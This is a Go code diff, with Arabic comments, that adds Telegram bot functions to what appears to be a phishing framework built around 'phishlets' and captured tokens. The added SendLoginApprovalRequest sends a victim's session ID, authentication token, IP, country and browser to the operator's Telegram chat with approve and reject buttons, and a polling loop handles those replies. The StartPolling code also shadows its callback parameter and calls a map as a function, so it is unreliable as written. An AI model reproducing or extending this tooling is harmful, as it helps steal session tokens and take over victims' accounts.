@@ -207,4 +207,344 @@ func (t *TelegramBot) NotifyTokensCaptured(sessionID string, phishlet string, ip
 	)
 
 	return t.SendMessage(message)
+}
+
+// نوع بيانات لتمثيل زر مدمج في تيليجرام
+type InlineKeyboardButton struct {
+	Text         string `json:"text"`
+	CallbackData string `json:"callback_data,omitempty"`
+}
+
+// نوع بيانات لتمثيل لوحة مفاتيح مدمجة
+type InlineKeyboardMarkup struct {
+	InlineKeyboard [][]InlineKeyboardButton `json:"inline_keyboard"`
+}
+
+// SendMessageWithButtons يرسل رسالة مع أزرار مدمجة
+func (t *TelegramBot) SendMessageWithButtons(message string, buttons [][]InlineKeyboardButton) (string, error) {
+	if !t.Enabled {
+		return "", nil
+	}
+
+	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
+	
+	// إنشاء بيانات لوحة المفاتيح المدمجة
+	markup := InlineKeyboardMarkup{
+		InlineKeyboard: buttons,
+	}
+	
+	// تحويل لوحة المفاتيح إلى JSON
+	markupJSON, err := json.Marshal(markup)
+	if err != nil {
+		return "", fmt.Errorf("فشل في تحويل الأزرار إلى JSON: %v", err)
+	}
+	
+	// إنشاء بيانات الطلب
+	data := url.Values{}
+	data.Set("chat_id", t.ChatID)
+	data.Set("text", message)
+	data.Set("parse_mode", "HTML")
+	data.Set("reply_markup", string(markupJSON))
+
+	// إنشاء وإرسال الطلب
+	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
+	if err != nil {
+		return "", fmt.Errorf("فشل في إنشاء طلب: %v", err)
+	}
+
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	// إضافة timeout للطلب
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("فشل في إرسال الرسالة: %v", err)
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", fmt.Errorf("فشل في قراءة الاستجابة: %v", err)
+	}
+
+	var result map[string]interface{}
+	err = json.Unmarshal(body, &result)
+	if err != nil {
+		return "", fmt.Errorf("فشل في تحليل استجابة تليجرام: %v", err)
+	}
+
+	ok, exists := result["ok"].(bool)
+	if !exists || !ok {
+		return "", fmt.Errorf("استجابة خاطئة من تليجرام: %s", string(body))
+	}
+
+	// استخراج معرف الرسالة المرسلة
+	var messageID string
+	if resultObj, exists := result["result"].(map[string]interface{}); exists {
+		if msgID, exists := resultObj["message_id"].(float64); exists {
+			messageID = fmt.Sprintf("%.0f", msgID)
+		}
+	}
+
+	log.Debug("telegram: تم إرسال الرسالة مع الأزرار بنجاح، معرف الرسالة: %s", messageID)
+	return messageID, nil
+}
+
+// EditMessage يقوم بتعديل رسالة موجودة
+func (t *TelegramBot) EditMessage(messageID string, newText string) error {
+	if !t.Enabled || messageID == "" {
+		return nil
+	}
+
+	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageText", t.Token)
+	
+	data := url.Values{}
+	data.Set("chat_id", t.ChatID)
+	data.Set("message_id", messageID)
+	data.Set("text", newText)
+	data.Set("parse_mode", "HTML")
+
+	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
+	if err != nil {
+		return fmt.Errorf("فشل في إنشاء طلب لتعديل الرسالة: %v", err)
+	}
+
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("فشل في تعديل الرسالة: %v", err)
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("فشل في قراءة الاستجابة: %v", err)
+	}
+
+	var result map[string]interface{}
+	err = json.Unmarshal(body, &result)
+	if err != nil {
+		return fmt.Errorf("فشل في تحليل استجابة تيليجرام: %v", err)
+	}
+
+	ok, exists := result["ok"].(bool)
+	if !exists || !ok {
+		return fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
+	}
+
+	log.Debug("telegram: تم تعديل الرسالة بنجاح، معرف الرسالة: %s", messageID)
+	return nil
+}
+
+// SendLoginApprovalRequest يرسل طلب موافقة لتسجيل الدخول مع أزرار
+func (t *TelegramBot) SendLoginApprovalRequest(sessionID string, authToken string, ipAddress string, userAgent string) (string, error) {
+	if !t.Enabled {
+		return "", nil
+	}
+
+	country := t.GetCountryFromIP(ipAddress)
+
+	// إنشاء نص الرسالة
+	message := fmt.Sprintf(
+		"🔐 <b>طلب تسجيل دخول جديد</b>\n\n"+
+			"🆔 <b>معرف الجلسة:</b> %s\n"+
+			"🔑 <b>توكن المصادقة:</b> %s\n"+
+			"🌍 <b>البلد:</b> %s\n"+
+			"🖥️ <b>عنوان IP:</b> %s\n"+
+			"📱 <b>المتصفح:</b> %s\n\n"+
+			"<b>هل تريد الموافقة على طلب تسجيل الدخول هذا؟</b>",
+		sessionID, authToken, country, ipAddress, userAgent,
+	)
+
+	// إنشاء أزرار الموافقة والرفض
+	buttons := [][]InlineKeyboardButton{
+		{
+			{
+				Text:         "✅ موافقة",
+				CallbackData: fmt.Sprintf("approve:%s:%s", sessionID, authToken),
+			},
+			{
+				Text:         "❌ رفض",
+				CallbackData: fmt.Sprintf("reject:%s", sessionID),
+			},
+		},
+	}
+
+	// إرسال الرسالة مع الأزرار
+	return t.SendMessageWithButtons(message, buttons)
+}
+
+// StartPolling يبدأ استطلاع تحديثات البوت
+func (t *TelegramBot) StartPolling(callback func(string, string)) {
+	if !t.Enabled {
+		log.Warning("لا يمكن بدء الاستطلاع: بوت تيليجرام غير مفعل")
+		return
+	}
+
+	log.Info("بدء استطلاع تحديثات بوت تيليجرام...")
+	
+	// استخدام offset للحصول على تحديثات جديدة فقط
+	offset := 0
+	
+	// بدء الاستطلاع في مؤشر ترابط منفصل
+	go func() {
+		for {
+			// استطلاع التحديثات
+			updates, err := t.getUpdates(offset)
+			if err != nil {
+				log.Error("فشل في الحصول على تحديثات التيليجرام: %v", err)
+				time.Sleep(5 * time.Second)
+				continue
+			}
+			
+			// معالجة التحديثات
+			for _, update := range updates {
+				// تحديث offset ليشير إلى التحديث التالي
+				updateID := int(update["update_id"].(float64))
+				offset = updateID + 1
+				
+				// البحث عن بيانات الاستدعاء (callback data)
+				if callback, ok := update["callback_query"].(map[string]interface{}); ok {
+					data, ok := callback["data"].(string)
+					if ok {
+						// تقسيم البيانات إلى أجزاء
+						parts := strings.Split(data, ":")
+						if len(parts) >= 2 {
+							action := parts[0]
+							sessionID := parts[1]
+							
+							// استخراج توكن المصادقة إذا كان موجودًا
+							authToken := ""
+							if action == "approve" && len(parts) >= 3 {
+								authToken = parts[2]
+							}
+							
+							// استدعاء الدالة المرجعية مع البيانات
+							go func(action, sessionID, authToken string) {
+								// تأكيد استلام الاستدعاء
+								t.answerCallbackQuery(callback["id"].(string), fmt.Sprintf("تم تنفيذ: %s", action))
+								
+								// استدعاء المعالج المسجل
+								callback(action, sessionID)
+							}(action, sessionID, authToken)
+						}
+					}
+				}
+			}
+			
+			// انتظار قبل الاستطلاع التالي
+			time.Sleep(1 * time.Second)
+		}
+	}()
+}
+
+// getUpdates يحصل على تحديثات البوت
+func (t *TelegramBot) getUpdates(offset int) ([]map[string]interface{}, error) {
+	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates", t.Token)
+	
+	data := url.Values{}
+	data.Set("offset", fmt.Sprintf("%d", offset))
+	data.Set("timeout", "30")
+	
+	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
+	if err != nil {
+		return nil, fmt.Errorf("فشل في إنشاء طلب تحديثات: %v", err)
+	}
+	
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	
+	client := &http.Client{
+		Timeout: 35 * time.Second,
+	}
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("فشل في الحصول على التحديثات: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("فشل في قراءة استجابة التحديثات: %v", err)
+	}
+	
+	var result map[string]interface{}
+	err = json.Unmarshal(body, &result)
+	if err != nil {
+		return nil, fmt.Errorf("فشل في تحليل استجابة التحديثات: %v", err)
+	}
+	
+	ok, exists := result["ok"].(bool)
+	if !exists || !ok {
+		return nil, fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
+	}
+	
+	updates, ok := result["result"].([]interface{})
+	if !ok {
+		return []map[string]interface{}{}, nil
+	}
+	
+	var updatesMap []map[string]interface{}
+	for _, update := range updates {
+		if updateMap, ok := update.(map[string]interface{}); ok {
+			updatesMap = append(updatesMap, updateMap)
+		}
+	}
+	
+	return updatesMap, nil
+}
+
+// answerCallbackQuery يؤكد استلام استدعاء من زر مدمج
+func (t *TelegramBot) answerCallbackQuery(callbackQueryID string, text string) error {
+	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/answerCallbackQuery", t.Token)
+	
+	data := url.Values{}
+	data.Set("callback_query_id", callbackQueryID)
+	if text != "" {
+		data.Set("text", text)
+		data.Set("show_alert", "true")
+	}
+	
+	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
+	if err != nil {
+		return fmt.Errorf("فشل في إنشاء طلب تأكيد الاستدعاء: %v", err)
+	}
+	
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("فشل في تأكيد الاستدعاء: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("فشل في قراءة استجابة تأكيد الاستدعاء: %v", err)
+	}
+	
+	var result map[string]interface{}
+	err = json.Unmarshal(body, &result)
+	if err != nil {
+		return fmt.Errorf("فشل في تحليل استجابة تأكيد الاستدعاء: %v", err)
+	}
+	
+	ok, exists := result["ok"].(bool)
+	if !exists || !ok {
+		return fmt.Errorf("استجابة خاطئة من تيليجرام: %s", string(body))
+	}
+	
+	return nil
 } 
